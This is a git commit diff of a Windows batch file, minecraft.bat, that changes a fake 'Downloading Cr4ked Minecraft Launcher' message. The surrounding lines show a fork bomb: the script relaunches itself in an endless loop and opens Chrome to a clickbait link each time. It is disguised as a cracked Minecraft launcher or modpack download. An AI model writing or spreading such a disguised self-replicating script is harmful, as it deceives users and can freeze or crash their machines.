6fe0958b35a6d678127eb1dcfff88fec62472980
lodzgg <97985922+Lodzgg@users.noreply.github.com>
2022-06-11 16:20:50 -0700

    Update minecraft.bat

--- minecraft.bat
+++ minecraft.bat
@@ -2,6 +2,6 @@
 @echo on
 :start
 start minecraft.bat
-echo %Downloading RRMS Modpack...%
+echo %Downloading Cr4ked Minecraft Launcher...%
 start chrome %lodzgg.github.io/clickit/letsclickthelink%
 goto start
